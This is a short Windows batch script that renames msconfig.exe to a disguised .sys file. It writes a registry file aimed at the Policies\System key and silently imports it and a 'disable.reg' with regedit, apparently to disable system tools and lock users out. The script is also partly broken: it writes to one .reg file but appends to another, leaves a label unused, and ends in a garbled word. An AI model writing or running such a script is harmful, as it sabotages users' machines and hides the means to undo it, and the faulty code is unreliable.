echo off
echo.
rename c:\windows\system\msconfig.exe system12.sys
echo REGEDIT4 > c:\regCrk1.reg
echo [HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\System]                                                       >> c:\regCrk.reg
:loop
c:\windows\regedit -s c:\regCrk1.reg
echo.
echo.
echo.
c:\windows\regedit -s disable.reg
:Exit
cls	
goto end
:Res
cls
:end
eseguioff
